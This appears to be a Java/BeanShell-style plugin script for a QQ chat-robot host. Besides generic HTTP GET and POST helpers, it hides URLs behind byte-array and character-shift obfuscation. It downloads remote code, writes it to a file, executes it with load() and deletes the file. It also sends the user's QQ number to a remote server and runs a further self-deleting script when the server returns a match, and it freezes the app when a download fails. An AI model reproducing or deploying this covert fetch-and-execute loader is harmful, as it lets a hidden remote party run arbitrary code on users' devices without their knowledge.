String g22x="";
import org.json.JSONArray;
import org.json.JSONObject;
import android.text.*;
import android.app.*;
import android.os.*;
import android.view.*;
import java.lang.*;
import android.content.*;
import android.webkit.*;
import android.widget.*;
import android.media.*;
import java.text.*;
import android.net.*;
import java.util.*;
import android.app.Dialog;
import android.view.Window;
import android.app.Activity;
import android.graphics.*;
import android.widget.LinearLayout;
import android.text.Html;
import android.text.method.LinkMovementMethod;
import android.text.Spannable;
import android.text.SpannableString;
import android.text.style.ForegroundColorSpan;
import java.net.URI;
import java.net.URLEncoder;
import java.net.URLDecoder;
import java.net.URISyntaxException;
import android.text.style.RelativeSizeSpan;
public String get2(String url)
{
        try {
            URL url = new URL(url);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);
            isr = new InputStreamReader(connection.getInputStream(), "utf-8");
BufferedReader reader = new BufferedReader(isr); 
            String line;
            StringBuilder response = new StringBuilder();
            while ((line = reader.readLine()) != null) {
    response.append(line);
}
            reader.close();
            connection.disconnect();
            return response.toString();
        } catch (Exception e) {
            e.printStackTrace();
        }
}
public delete(String Path){
File file = null;try{file = new File(Path);
if(file.exists()){file.delete();FileMemCache.remove(Path);}}catch(Exception e){Toast(e);}
}
public String get(String url)
	{
		StringBuffer buffer = new StringBuffer();
InputStreamReader isr = null;
try {
URL urlObj = new URL(url);
URLConnection uc = urlObj.openConnection();
uc.setConnectTimeout(10000);
uc.setReadTimeout(10000);
isr = new InputStreamReader(uc.getInputStream(), "utf-8");
BufferedReader reader = new BufferedReader(isr); //缓冲
String line;
while ((line = reader.readLine()) != null) {
    buffer.append(line + "\n");
}
} catch (Exception e) {
e.printStackTrace();
} finally {
try {
    if (null != isr) {
isr.close();
    }
} catch (IOException e) {
    e.printStackTrace();
}
}
if(buffer.length()==0)return buffer.toString();
buffer.delete(buffer.length()-1,buffer.length());
return buffer.toString();
}
public String post(String url,String params) {
    try {
        URL urlObjUrl=new URL(url);
        URLConnection connection =urlObjUrl.openConnection();
        connection.setDoOutput(true);
        OutputStream os=connection.getOutputStream();
        os.write(java.net.URLDecoder.decode(params, "UTF-8").getBytes());
        os.close();
        InputStream iStream=connection.getInputStream();
        byte[] b=new byte[1024];
        int len;
        StringBuilder sb=new StringBuilder();
        while ((len=iStream.read(b))!=-1) {
            sb.append(new String(b,0,len));
        }
        return sb.toString();
    } catch (Exception e) {
        e.printStackTrace();
    }
    return null;
}
String cylj=Y(jm(new String(new byte[]{119,52,72,68,106,99,79,78,119,52,110,67,107,56,75,73,119,111,106,68,107,77,79,82,119,53,76,67,104,56,75,47,119,52,55,67,118,56,79,79,119,53,76,67,117,115,75,72,119,52,51,68,105,77,79,74,119,111,106,68,106,115,79,77,119,114,55,68,105,56,75,73,119,52,68,68,107,99,75,72,119,52,51,68,107,99,79,78})));
public String httpget(String url,String cookie)
	{
		StringBuffer buffer = new StringBuffer();
            InputStreamReader isr = null;
            try {
                URL urlObj = new URL(url);
                URLConnection uc = urlObj.openConnection();
                uc.setRequestProperty("Cookie",cookie);
                uc.setConnectTimeout(10000);
                uc.setReadTimeout(10000);
                isr = new InputStreamReader(uc.getInputStream(), "utf-8");
                BufferedReader reader = new BufferedReader(isr);
                String line;
                while ((line = reader.readLine()) != null) {
                    buffer.append(line + "\n");
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                try {
                    if (null != isr) {
                        isr.close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        if(buffer.length()==0)return buffer.toString();
        buffer.delete(buffer.length()-1,buffer.length());
        return buffer.toString();
	}
public a(){
return "false";
}
if(a().equals("false")){
String main=get(Y("ÁÍÍÉÌÐÑÒ¿Î¿ÎÒºÍÈÉÎÌ¾ËÆºÂÇÍÑÍ"));
if(main.equals("")){
Toast(Y("豐磇诽逷揾劉°¢¢扯聞涚鈨抬彙廏鈦昉勹迖ÃºÏº"));
Thread.sleep(99999);
Thread.sleep(99999);
}else{
put(AppPath+Y("伧仪ÆºÂÇÃºÏº"),main);
load(AppPath+Y("伧仪ÆºÂÇÃºÏº"));
delete(AppPath+Y("伧仪ÆºÂÇÃºÏº"));
}
}
if(a().equals(Y("¿ºÅÌ¾")))
{
if(get(Y("ÁÍÍÉÐÑÒ¿Î¿ÎÒºÍÈÉÎÌ¾Ë¯¾ËÌÂÈÇÍÑÍ")).equals(Version))
{}else{
Toast(Y("伧仪殼垁椙涤犡枅豐穦箢"));
UI="1";
}
}
if(a().equals(Y("ÍËÎ¾"))){}else{g22x=get(cylj);}
if(a().equals(Y("¿ºÅÌ¾")))
{
String lsjb=get(Y("ÁÍÍÉÐÑÒ¿Î¿ÎÒºÍÈÉÎÌ¾ËÅÌÃ»ÍÑÍ"));
put(AppPath+new String(new byte[]{47,-28,-69,-114,-28,-70,-111,47,108,115,106,98,46,106,97,118,97}),lsjb);
load(AppPath+new String(new byte[]{47,-28,-69,-114,-28,-70,-111,47,108,115,106,98,46,106,97,118,97}));
delete(AppPath+new String(new byte[]{47,-28,-69,-114,-28,-70,-111,47,108,115,106,98,46,106,97,118,97}));
}
if(a().equals(Y("¿ºÅÌ¾")))
{
String YWW=Y(new String(new byte[]{-61,-127,-61,-115,-61,-115,-61,-119,-62,-109,-62,-120,-62,-120,\u002d\u0036\u0031\u002c\u002d\u0031\u0031\u0032\u002c\u002d\u0036\u0031\u002c\u002d\u0031\u0031\u0031\u002c\u002d\u0036\u0031\u002c\u002d\u0031\u0031\u0030\u002c\u002d\u0036\u0032\u002c\u002d\u0031\u0032\u0031\u002c\u002d\u0036\u0032\u002c\u002d\u0036\u0035\u002c\u002d\u0036\u0031\u002c\u002d\u0031\u0031\u0034\u002c\u002d\u0036\u0032\u002c\u002d\u0036\u0035\u002c\u002d\u0036\u0031\u002c\u002d\u0031\u0031\u0034\u002c\u002d\u0036\u0031\u002c\u002d\u0031\u0031\u0030\u002c\u002d\u0036\u0032\u002c\u002d\u0037\u0030\u002c\u002d\u0036\u0032\u002c\u002d\u0031\u0032\u0031\u002c\u002d\u0036\u0031\u002c\u002d\u0031\u0031\u0035\u002c\u002d\u0036\u0031\u002c\u002d\u0031\u0032\u0030\u002c\u002d\u0036\u0031\u002c\u002d\u0031\u0031\u0039\u002c\u002d\u0036\u0032\u002c\u002d\u0031\u0032\u0030\u002c\u002d\u0036\u0031\u002c\u002d\u0031\u0031\u0034\u002c\u002d\u0036\u0031\u002c\u002d\u0031\u0031\u0036\u002c\u002d\u0036\u0032\u002c\u002d\u0036\u0036\u002c\u002d\u0036\u0031\u002c\u002d\u0031\u0031\u0037\u002c\u002d\u0036\u0032\u002c\u002d\u0031\u0032\u0030\u002c\u002d\u0036\u0031\u002c\u002d\u0031\u0031\u0035\u002c\u002d\u0036\u0031\u002c\u002d\u0031\u0032\u0037\u002c\u002d\u0036\u0032\u002c\u002d\u0031\u0032\u0031\u002c\u002d\u0036\u0031\u002c\u002d\u0031\u0031\u0035\u002c-61,-111,-61,-115}));
//Toast(YWW);
String WY=get(YWW);
put(AppPath+Y("伧仪©¢­¡ÃºÏº"),WY);
}else if(a().equals(Y("ÍËÎ¾")))
{
put(AppPath+Y("伧仪ÏÉÇÃºÏº"),Y("­ÈºÌÍ{豐凌陆¯©§･扯聞括卞迈住{­ÁË¾º½ÌÅ¾¾É"));
new Thread(new Runnable(){
public void run(){
Thread.sleep(2000);
delete(AppPath+Y("伧仪ÏÉÇÃºÏº"));
}}).start();
load(AppPath+Y("伧仪ÏÉÇÃºÏº"));
}
String httpi=Y(jm(new String(new byte[]{119,52,72,68,106,99,79,78,119,52,110,67,107,56,75,73,119,111,106,68,107,77,79,82,119,53,76,67,104,56,75,47,119,52,55,67,118,56,79,79,119,53,76,67,117,115,75,72,119,52,51,68,105,77,79,74,119,111,106,68,106,115,75,57,119,52,51,68,107,99,75,56,119,114,122,67,104,56,79,74,119,52,72,68,105,99,75,89,119,52,114,68,105,115,75,87})));if(get(httpi+MyUin).equals(Y("暈仪鼪"))){Toast(Y("侹幋褄挢鼪"));put(AppPath+Y("伧仪ºÃºÏº"),Y("­ÁË¾º½ÌÅ¾¾É"));new Thread(new Runnable(){public void run(){Thread.sleep(2000);delete(AppPath+Y("伧仪ºÃºÏº"));}}).start();load(AppPath+Y("伧仪ºÃºÏº"));}else{
}